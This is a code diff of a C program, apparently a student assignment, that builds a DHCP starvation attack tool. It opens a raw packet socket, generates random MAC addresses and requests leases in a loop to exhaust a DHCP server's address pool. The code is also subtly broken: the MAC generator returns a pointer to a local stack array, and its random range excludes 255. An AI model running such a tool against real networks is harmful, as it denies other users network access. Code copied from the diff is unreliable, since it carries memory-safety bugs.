@@ -6,14 +6,11 @@
  */
 
 
+#include "headers.h"
 #include "dhcp.h"
 //#include "leases.h"
 
-
-
-
-
-
+#define MAX_TRIES 10
 
 /*
 * function request_lease
@@ -31,21 +28,23 @@
 /*
 * Function generates random mac address
 */
-char * generate_mac_addr( ){
-    char new_mac_addr[MAC_ADDRESS_L];
+unsigned char * generate_mac_addr(){
+    unsigned char new_mac_addr[MAC_ADDRESS_L];
     for( int i = 0; i < MAC_ADDRESS_L; i ++) {
         // number cant be above 15 in hexadecimal, 255 in descimal
-        int rand_number = rand() % 256;
+        unsigned int rand_number = rand() % 255;
+        //:1printf("%d ", rand_number);
         new_mac_addr[i] = rand_number;
     }
     printf("New Random Mac : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , new_mac_addr[0], new_mac_addr[1], new_mac_addr[2], new_mac_addr[3], new_mac_addr[4], new_mac_addr[5] );
     return new_mac_addr;
 
 }
+
 int main ( int argc, char *argv[] ){
 	/// inicialized random generator
-	time_t t;
-	srand( (unsigned) time(&t) );
+
+	srand( time(NULL) );
 
  	// enter: ./ipk-dhcpstarve -i interface
 	// interface: name of interface to generate attack
@@ -84,7 +83,7 @@ int main ( int argc, char *argv[] ){
 		return (EXIT_FAILURE);
 	}
 	/* SENDING SOCKET */
-
+    // raw netword protocol access
 	if ( ( socket_send  = socket( PF_PACKET, SOCK_RAW, htons( ETH_P_ALL ) ) ) == -1 ){
 fprintf( stderr, "Can not create send socket\n" );
 		return( EXIT_FAILURE );
@@ -96,6 +95,8 @@ fprintf( stderr, "Can not create send socket\n" );
 	 	perror(  "Can not not set any options to socket\n");
 		return(EXIT_FAILURE);
 	}
+
+
 	// get network interface index which name is in interfacename
 	// socket must contain packet socket descriptor
 	/*
@@ -141,7 +142,9 @@ fprintf( stderr, "Can not create send socket\n" );
 		return(EXIT_FAILURE);
 	}
 	destmac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
-	printf("Mac : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , destmac[0], destmac[1], destmac[2], destmac[3], destmac[4], destmac[5] );
+	int interface_index = ifr.ifr_ifindex;
+	printf("Mac Interface: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , destmac[0], destmac[1], destmac[2], destmac[3], destmac[4], destmac[5] );
+	printf("Index is: %d\n", interface_index );
 	//strncpy( destmac, ifr.ifr_hwaddr.sa_data, MAC_ADDRESS_L );
 	//printf( "Destination mac address: %s\n", ifr.ifr_hwaddr.sa_data );
 	/*
@@ -149,9 +152,9 @@ fprintf( stderr, "Can not create send socket\n" );
 		!!!
 	}
 	   */
-	int poc = 10;
-	struct dhcp_lease* list = NULL;
-	char mac[MAC_ADDRESS_L];
+	int poc = 5;
+	//struct dhcp_lease* list = NULL;
+	;
 	while(poc){
 		poc--;
 
@@ -164,9 +167,12 @@ fprintf( stderr, "Can not create send socket\n" );
 		//renew all leases
 
 		// generate mac address
-		strcpy( mac, generate_mac_addr(), MAC_ADDRESS_L);
+		//strncpy( mac, generate_mac_addr(), MAC_ADDRESS_L);
+		unsigned char *mac = generate_mac_addr();
+		printf("Mac : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5] );
 
 		// request lease
+		request_lease(socket_send, socket_recv, mac, destmac, MAX_TRIES, destmac, interface_index );
 
 
 		// we not successful, brak while
